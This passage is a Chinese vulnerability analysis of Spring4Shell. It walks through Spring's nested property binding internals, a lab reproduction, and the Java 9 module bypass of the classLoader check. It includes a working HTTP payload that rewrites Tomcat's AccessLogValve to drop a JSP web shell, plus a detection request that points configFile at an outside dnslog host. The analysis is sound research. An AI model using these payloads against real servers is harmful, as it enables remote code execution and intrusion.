    autoGrowNestedPaths=true 时当属性为 null 时自动创建对象
    beanWrapper.setAutoGrowNestedPaths(true);
    beanWrapper.setPropertyValue("director.name", "director");
    beanWrapper.setPropertyValue("employees[0].name", "t4r");
#### 获取类实例
    Person person = (Person) beanWrapper.getWrappedInstance();
#### 获取对象属性
    String name = (String) beanWrapper.getPropertyValue("name");
### AbstractNestablePropertyAccessor
BeanWrapper 有两个核心的实现类
  * `AbstractNestablePropertyAccessor` 提供对嵌套属性的支持
  * `BeanWrapperImpl` 提供对 JavaBean 的内省功能，如`PropertyDescriptor`
上面已经简单介绍过了`BeanWrapperImpl`
而在`Spring-framework
4.2`之后，`AbstractNestablePropertyAccessor`将原`BeanWrapperImpl`的功能抽出，`BeanWrapperImpl`只提供对`JavaBean`的内省功能，所以很多老哥看`CVE-2010-1622`的分析时可能会比较疑惑
#### 核心成员属性
  * `Object wrappedObject`：被`BeanWrapper`包装的对象
  * `String nestedPath`：当前`BeanWrapper`对象所属嵌套层次的属性名，最顶层的`BeanWrapper`的`nestedPath`的值为空
  * `Object rootObject`：最顶层`BeanWrapper`所包装的对象
  * `Map nestedPropertyAccessors`：缓存当前`BeanWrapper`的嵌套属性的`nestedPath`和对应的`BeanWrapperImpl`对象
#### getPropertyAccessorForPropertyPath
`getPropertyAccessorForPropertyPath`根据属性(`propertyPath`)获取所在`bean`的包装对象`beanWrapper`，如果是类似`class.module.classLoader`的嵌套属性，则需要递归获取。真正获取指定属性的包装对象则由方法`getNestedPropertyAccessor`完成
该函数内的具体操作，以属性`class.module.classLoader`为例
  1. 获取第一个`.`之前的属性部分
  2. `递归`处理嵌套属性
    1. 先获取`class`属性所在类的`rootBeanWrapper`
    2. 再获取`module`属性所在类的`classBeanWrapper`
    3. 以此类推，获取最后一个属性classLoader属性所在类的`moduleBeanWrapper`
`getPropertyAccessorForPropertyPath`处理属性有两种情况:
  * class（不包含`.`）：直接范围当前bean的包装对象
  * class.module.classLoader（包含`.`）：从当前对象开始递归查找，查找当前`beanWrapper`指定属性的包装对象由`getNestedPropertyAccessor()`完成
`getNestedPropertyAccessor`函数中的主要工作如下：
  * `nestedPropertyAccessors`用于缓存已经查找到过的属性
  * `getPropertyNameTokens`获取属性对应的`token`值，主要用于解循环嵌套属性
  * 属性不存在则根据`autoGrowNestedPaths` 决定是否自动创建
  * 先从缓存中获取，没有就创建一个新的`AbstractNestablePropertyAccessor`对象
#### PropertyTokenHolder
  * 用于解析嵌套属性名称
#### PropertyHandler
  * `PropertyHandler`的默认实现是`BeanPropertyHandler`，位于`BeanWrapperImpl`内
  * `BeanPropertyHandler`是对`PropertyDescriptor`的封装，提供了对`JavaBean`底层的操作，如属性的读写
#### setPropertyValue
该函数内的主要操作如下
  * 调用`getPropertyAccessorForPropertyPath`递归获取`propertyName`属性所在的`beanWrapper`
  * 获取属性的`token`，`token`用于标记该次属性注入是简单属性注入，还是`Array、Map、List、Set`复杂类型的属性注入
  * 设置属性值
#### getPropertyValue
  * 顾名思义，根据属性名称获取对应的值
  * 通过反射完成
#### setDefaultValue
  * `autoGrowNestedPaths=true`时会创建默认的对象
  * 创建对象的操作会由`setDefaultValue`调用其无参构造方法完成
## 漏洞分析
### 漏洞复现
IDEA创建一个SpringMVC项目，搭建过程不赘述
**web.xml**
            springMVC
            org.springframework.web.servlet.DispatcherServlet
                contextConfigLocation
                WEB-INF/springMVC.xml
            1
            springMVC
            /
**springMVC.xml**
**maven**
       org.springframework
       spring-beans
       5.3.17
**Controller**
    package com.example.springshell.controller;
    import com.example.springshell.bean.Person;
    import org.springframework.web.bind.annotation.RequestMapping;
    import org.springframework.web.bind.annotation.RestController;
    @RestController
    public class TestController {
        @RequestMapping("/hello")
        public String hello(Person person){
            return person.getName();
        }
    }
**JavaBean**
    package com.example.springshell.bean;
    public class Person{
        private String name;
        private int age;
        public int getAge(){
            return age;
        }
        public String getName(){
            return name;
        }
        public void setAge(int age){
            this.age = age;
        }
        public void setName(String name){
            this.name = name;
        }
    }
**payload**
    POST /hello HTTP/1.1
    Host: localhost:8082
    Pragma: no-cache
    Cache-Control: no-cache
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
    X-Requested-With: XMLHttpRequest
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Referer: http://192.168.10.128:8080/
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
    Content-Type: application/x-www-form-urlencoded
    Cookie: JSESSIONID=EDD95D704336C807D0EB1A404D1D1BB9
    Connection: close
    suffix: %>
    prefix: ")%3bwhile((a%3din.read(b))!%3d-1){+out.println(new+String(b))%3b+}out.print("")%3b%25{suffix}i&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=/Users/t4rrega/Desktop/&class.module.classLoader.resources.context.parent.pipeline.first.prefix=bean-rce&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
### 断点分析
在有了上文的属性注入基础后，再来分析漏洞过程，就显得格外清晰了
上文中提到`Spring-framework 4.2`之后由`AbstractNestablePropertyAccessor`来完成嵌套输入注入的支持
在`AbstractNestablePropertyAccessor#setPropertyValue`处设置断点，根据设置的控制器路由，发送上述的http请求，触发断点（断点的位置已经是完成了参数绑定后的位置，参数绑定主要是通过`DataBinder`完成，该操作不是漏洞的关键点，略过）
可以看到函数的入参是pv，我们追溯一下，可以发现`AbstractPropertyAccessor#setPropertyValues`通过for循环，对请求中的每一个键值对，调用`AbstractNestablePropertyAccessor#setPropertyValue`进行属性注入操作
回到`AbstractNestablePropertyAccessor#setPropertyValue`，分析一下该函数做的事：
  * 创建了一个`PropertyTokenHolder`对象，上文中也提到，用于解析嵌套属性名称
  * 属性名存在则创建一个`AbstractNestablePropertyAccessor`对象，并调用`getPropertyAccessorForPropertyPath`
此时的`propertyName`为`class.module.classLoader.resources.context.parent.pipeline.first.directory`，跟入`getPropertyAccessorForPropertyPath`
在`getPropertyAccessorForPropertyPath`中，正如前文所说，通过递归的方式，获取嵌套属性的包装对象`beanWrapper`
这里首先会通过`getFirstNestedPropertySeparatorIndex`拿到`.`前的一个属性，拿到`class`属性后，调用`getNestedPropertyAccessor`
该函数中:
  * 创建了一个缓存列表，在后续操作中，判断获取的属性是否已经在列表中，如在则直接获取，否则会新创建一个`AbstractNestablePropertyAccessor`
  * 创建了一个`PropertyTokenHolder`，之后调用`getPropertyValue`处理它
简单提一下，这里的缓存列表结构如下，可以发现嵌套的属性
在`AbstractNestablePropertyAccessor#getPropertyValue`中又调用`getLocalPropertyHandler`处理传入的`PropertyTokenHolder`中的`actualName（即class）`
`AbstractNestablePropertyAccessor`中的`getLocalPropertyHandler`是一个抽象方法，其唯一子类`BeanWrapperImpl`重写了该方法，跟入该方法
调用了`CachedIntrospectionResults#getPropertyDescriptor`
而真正的逻辑在其构造方法中，看到了我们熟悉的`getBeanInfo`
这里也就解释了我们为什么能获取到`class`这个属性值，因此其没用调用另一个有`stopclass`参数的重载方法
到此，算是完成了获取class这个参数的beanWrapper
回到`AbstractNestablePropertyAccessor.setPropertyValue`
接着会调用重载的方法，进行属性的注入
又调用了`processLocalProperty`
`processLocalProperty`函数之前也提到过，完成了`类型转换`以及调用`BeanWrapperImpl#setValue`通过反射完成了最终的`属性注入`
### 绕过
在`CachedIntrospectionResults`的构造方法中，可以看到对`beanClass`以及属性名做了判断
  * `beanClass`非`class`
  * 属性名非`classLoader`或`protectionDomain`
显然`Class.getClassLoader`被拦截了
但是Java9新增了`module`，可以通过`Class.getModule`方法调用`getClassloader`的方式继续访问更多对象的属性
### Payload
在调试过程中，发现了payload中的
`class.module.classLoader.resources.context.parent.pipeline.first`
  * `context`对应`StandardContext`
  * `parent`对应`StandardHost`
  * `pipeline`对应`StandardPipeline`
  * `first`对应`AccessLogValve`
因此，公开的利用链也就是利用`AccessLogValve`，这个类用来设置`tomcat`得日志存储参数，修改参数可以达到文件写入的效果
payload中
    suffix: %>
    prefix: ")%3bwhile((a%3din.read(b))!%3d-1){+out.println(new+String(b))%3b+}out.print("")%3b%25{suffix}i&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=/Users/t4rrega/Desktop/&class.module.classLoader.resources.context.parent.pipeline.first.prefix=bean-rce&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
由于`%`会被过滤，`pattern`里通过引用头部来实现构造
%{x}i可引用请求头字段
    %{x}i 请求headers的信息
    %{x}o 响应headers的信息
    %{x}c 请求cookie的信息
    %{x}r xxx是ServletRequest的一个属性
    %{x}s xxx是HttpSession的一个属性
此外`StandardContext`中的configFile可发送http请求，可以用于漏洞的检测
发送如下请求
    POST /springshell_war_exploded/hello HTTP/1.1
    Host: localhost:8082
    Pragma: no-cache
    Cache-Control: no-cache
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
    X-Requested-With: XMLHttpRequest
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Referer: http://192.168.10.128:8080/
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
    Content-Type: application/x-www-form-urlencoded
    Cookie: JSESSIONID=EDD95D704336C807D0EB1A404D1D1BB9
    Connection: close
    Content-Length: 163
    class.module.classLoader.resources.context.configFile=http://test.9vvyp3.dnslog.cn&class.module.classLoader.resources.context.configFile.content.config=config.conf
DNS记录
## 参考文章